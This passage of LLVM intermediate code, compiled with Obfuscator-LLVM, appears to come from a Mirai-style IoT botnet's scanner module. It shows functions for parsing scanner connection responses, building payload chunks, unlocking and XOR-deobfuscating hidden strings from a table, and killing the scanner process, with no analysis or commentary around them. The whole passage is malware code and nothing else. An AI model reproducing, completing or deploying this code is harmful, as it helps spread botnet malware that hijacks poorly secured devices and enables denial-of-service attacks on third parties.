  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.binary*, align 8
  %6 = alloca [5 x i8], align 1
  %7 = alloca i32, align 4
  %8 = alloca [256 x i8], align 16
  store %struct.payload* %0, %struct.payload** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  store i32 0, i32* %7, align 4
  %9 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %9, i8 0, i64 256, i32 16, i1 false)
  %10 = load %struct.payload*, %struct.payload** %2, align 8
  %11 = getelementptr inbounds %struct.payload, %struct.payload* %10, i32 0, i32 3
  %12 = load i16, i16* %11, align 8
  %13 = zext i16 %12 to i32
  %14 = sdiv i32 %13, 64
  %15 = add nsw i32 %14, 1
  %16 = sext i32 %15 to i64
  %17 = call noalias i8* @calloc(i64 %16, i64 16) #7
  %18 = bitcast i8* %17 to %struct.binary*
  store %struct.binary* %18, %struct.binary** %5, align 8
  store i32 0, i32* %3, align 4
  br label %19

; <label>:19:                                     ; preds = %35, %1
  %20 = load i32, i32* %3, align 4
  %21 = load %struct.payload*, %struct.payload** %2, align 8
  %22 = getelementptr inbounds %struct.payload, %struct.payload* %21, i32 0, i32 3
  %23 = load i16, i16* %22, align 8
  %24 = zext i16 %23 to i32
  %25 = sdiv i32 %24, 64
  %26 = add nsw i32 %25, 1
  %27 = icmp slt i32 %20, %26
  br i1 %27, label %28, label %38

; <label>:28:                                     ; preds = %19
  %29 = call noalias i8* @malloc(i64 256) #7
  %30 = load %struct.binary*, %struct.binary** %5, align 8
  %31 = load i32, i32* %3, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds %struct.binary, %struct.binary* %30, i64 %32
  %34 = getelementptr inbounds %struct.binary, %struct.binary* %33, i32 0, i32 0
  store i8* %29, i8** %34, align 8
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %3, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %3, align 4
  br label %19

; <label>:38:                                     ; preds = %19
  br label %39

; <label>:39:                                     ; preds = %91, %38
  store i32 0, i32* %3, align 4
  br label %40

; <label>:40:                                     ; preds = %77, %39
  %41 = load i32, i32* %3, align 4
  %42 = load %struct.payload*, %struct.payload** %2, align 8
  %43 = getelementptr inbounds %struct.payload, %struct.payload* %42, i32 0, i32 3
  %44 = load i16, i16* %43, align 8
  %45 = zext i16 %44 to i32
  %46 = icmp slt i32 %41, %45
  br i1 %46, label %47, label %80

; <label>:47:                                     ; preds = %40
  %48 = load i32, i32* %3, align 4
  %49 = icmp eq i32 %48, 64
  br i1 %49, label %59, label %50

; <label>:50:                                     ; preds = %47
  %51 = load i32, i32* %4, align 4
  %52 = load i32, i32* %3, align 4
  %53 = add nsw i32 %51, %52
  %54 = load %struct.payload*, %struct.payload** %2, align 8
  %55 = getelementptr inbounds %struct.payload, %struct.payload* %54, i32 0, i32 3
  %56 = load i16, i16* %55, align 8
  %57 = zext i16 %56 to i32
  %58 = icmp sge i32 %53, %57
  br i1 %58, label %59, label %60

; <label>:59:                                     ; preds = %50, %47
  br label %80

; <label>:60:                                     ; preds = %50
  %61 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %61, i8 0, i64 5, i32 1, i1 false)
  %62 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i32 0, i32 0
  %63 = load %struct.payload*, %struct.payload** %2, align 8
  %64 = getelementptr inbounds %struct.payload, %struct.payload* %63, i32 0, i32 2
  %65 = load i8*, i8** %64, align 8
  %66 = load i32, i32* %4, align 4
  %67 = load i32, i32* %3, align 4
  %68 = add nsw i32 %66, %67
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %65, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = zext i8 %71 to i32
  %73 = call i32 (i8*, i8*, ...) @szprintf(i8* %62, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.130, i32 0, i32 0), i32 %72)
  %74 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  %75 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i32 0, i32 0
  %76 = call i8* @strcat(i8* %74, i8* %75) #7
  br label %77

; <label>:77:                                     ; preds = %60
  %78 = load i32, i32* %3, align 4
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %3, align 4
  br label %40

; <label>:80:                                     ; preds = %59, %40
  %81 = load i32, i32* %7, align 4
  %82 = load %struct.payload*, %struct.payload** %2, align 8
  %83 = getelementptr inbounds %struct.payload, %struct.payload* %82, i32 0, i32 3
  %84 = load i16, i16* %83, align 8
  %85 = zext i16 %84 to i32
  %86 = sdiv i32 %85, 64
  %87 = add nsw i32 %86, 1
  %88 = icmp eq i32 %81, %87
  br i1 %88, label %89, label %91

; <label>:89:                                     ; preds = %80
  %90 = load %struct.binary*, %struct.binary** %5, align 8
  ret %struct.binary* %90

; <label>:91:                                     ; preds = %80
  %92 = load %struct.binary*, %struct.binary** %5, align 8
  %93 = load i32, i32* %7, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.binary, %struct.binary* %92, i64 %94
  %96 = getelementptr inbounds %struct.binary, %struct.binary* %95, i32 0, i32 0
  %97 = load i8*, i8** %96, align 8
  %98 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  %99 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  %100 = call i32 @util_strlen(i8* %99)
  %101 = sext i32 %100 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %97, i8* %98, i64 %101, i32 1, i1 false)
  %102 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %102, i8 0, i64 256, i32 16, i1 false)
  %103 = load i32, i32* %7, align 4
  %104 = trunc i32 %103 to i8
  %105 = load %struct.binary*, %struct.binary** %5, align 8
  %106 = getelementptr inbounds %struct.binary, %struct.binary* %105, i32 0, i32 1
  store i8 %104, i8* %106, align 8
  %107 = load i32, i32* %7, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %7, align 4
  %109 = load i32, i32* %3, align 4
  %110 = load i32, i32* %4, align 4
  %111 = add nsw i32 %110, %109
  store i32 %111, i32* %4, align 4
  br label %39
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_method_resonse(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  %7 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %7, i32 0, i32 7
  %9 = getelementptr inbounds [8192 x i8], [8192 x i8]* %8, i32 0, i32 0
  %10 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %11 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %10, i32 0, i32 4
  %12 = load i32, i32* %11, align 8
  %13 = call i32 @util_memsearch(i8* %9, i32 %12, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.150, i32 0, i32 0), i32 20)
  %14 = icmp ne i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 -2, i32* %2, align 4
  br label %44

; <label>:16:                                     ; preds = %1
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 7
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i32 0, i32 0
  %20 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %21 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %20, i32 0, i32 4
  %22 = load i32, i32* %21, align 8
  %23 = call i32 @util_memsearch(i8* %19, i32 %22, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.151, i32 0, i32 0), i32 16)
  %24 = icmp ne i32 %23, -1
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %16
  store i32 -1, i32* %2, align 4
  br label %44

; <label>:26:                                     ; preds = %16
  br label %27

; <label>:27:                                     ; preds = %26
  call void @table_unlock_val(i8 zeroext 12)
  %28 = call i8* @table_retrieve_val(i32 12, i32* %6)
  store i8* %28, i8** %4, align 8
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %29, i32 0, i32 7
  %31 = getelementptr inbounds [8192 x i8], [8192 x i8]* %30, i32 0, i32 0
  %32 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %33 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %32, i32 0, i32 4
  %34 = load i32, i32* %33, align 8
  %35 = load i8*, i8** %4, align 8
  %36 = load i32, i32* %6, align 4
  %37 = sub nsw i32 %36, 1
  %38 = call i32 @util_memsearch(i8* %31, i32 %34, i8* %35, i32 %37)
  store i32 %38, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 12)
  %39 = load i32, i32* %5, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %27
  store i32 0, i32* %2, align 4
  br label %44

; <label>:42:                                     ; preds = %27
  %43 = load i32, i32* %5, align 4
  store i32 %43, i32* %2, align 4
  br label %44

; <label>:44:                                     ; preds = %42, %41, %25, %15
  %45 = load i32, i32* %2, align 4
  ret i32 %45
}

declare i32 @util_memsearch(i8*, i32, i8*, i32) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %6, i32 0, i32 0
  %8 = bitcast %struct.__va_list_tag* %7 to i8*
  call void @llvm.va_start(i8* %8)
  %9 = load i8*, i8** %4, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %6, i32 0, i32 0
  %12 = call i32 @vsprintf(i8* %9, i8* %10, %struct.__va_list_tag* %11) #7
  %13 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %6, i32 0, i32 0
  %14 = bitcast %struct.__va_list_tag* %13 to i8*
  call void @llvm.va_end(i8* %14)
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #1

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #3

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #7

; Function Attrs: nounwind
declare i32 @vsprintf(i8*, i8*, %struct.__va_list_tag*) #1

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #7

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.scanner_connection*, i8*, i32) #0 {
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 4
  %13 = load i32, i32* %12, align 8
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i8, i8* %10, i64 %14
  store i8* %15, i8** %7, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8*, i8** %7, align 8
  %21 = icmp ult i8* %19, %20
  %22 = zext i1 %21 to i32
  %23 = trunc i32 %22 to i8
  ret i8 %23
}

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define internal i8* @deobf(i8*, i32*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32* %1, i32** %4, align 8
  %7 = load i8*, i8** %3, align 8
  %8 = call i32 @util_strlen(i8* %7)
  %9 = load i32*, i32** %4, align 8
  store i32 %8, i32* %9, align 4
  %10 = load i32*, i32** %4, align 8
  %11 = load i32, i32* %10, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = call noalias i8* @malloc(i64 %13) #7
  store i8* %14, i8** %6, align 8
  %15 = load i8*, i8** %6, align 8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32*, i32** %4, align 8
  %18 = load i32, i32* %17, align 4
  %19 = add nsw i32 %18, 1
  call void @util_memcpy(i8* %15, i8* %16, i32 %19)
  store i32 0, i32* %5, align 4
  br label %20

; <label>:20:                                     ; preds = %58, %2
  %21 = load i32, i32* %5, align 4
  %22 = load i32*, i32** %4, align 8
  %23 = load i32, i32* %22, align 4
  %24 = icmp slt i32 %21, %23
  br i1 %24, label %25, label %61

; <label>:25:                                     ; preds = %20
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = xor i32 %31, 222
  %33 = trunc i32 %32 to i8
  store i8 %33, i8* %29, align 1
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = sext i8 %38 to i32
  %40 = xor i32 %39, 173
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %37, align 1
  %42 = load i8*, i8** %6, align 8
  %43 = load i32, i32* %5, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = xor i32 %47, 190
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %45, align 1
  %50 = load i8*, i8** %6, align 8
  %51 = load i32, i32* %5, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = xor i32 %55, 239
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %53, align 1
  br label %58

; <label>:58:                                     ; preds = %25
  %59 = load i32, i32* %5, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %5, align 4
  br label %20

; <label>:61:                                     ; preds = %20
  %62 = load i8*, i8** %6, align 8
  ret i8* %62
}

declare void @util_memcpy(i8*, i8*, i32) #2

; Function Attrs: noinline nounwind uwtable
define void @scanner_kill() #0 {
  %1 = load i32, i32* @scanner_pid, align 4
  %2 = call i32 @kill(i32 %1, i32 9) #7
  ret void
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { noreturn nounwind }
attributes #9 = { nounwind readnone }
attributes #10 = { nounwind readonly }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146781110}
!2 = !{i32 -2146780704}
!3 = !{i32 -2146590635}
!4 = !{i32 -2146590226}
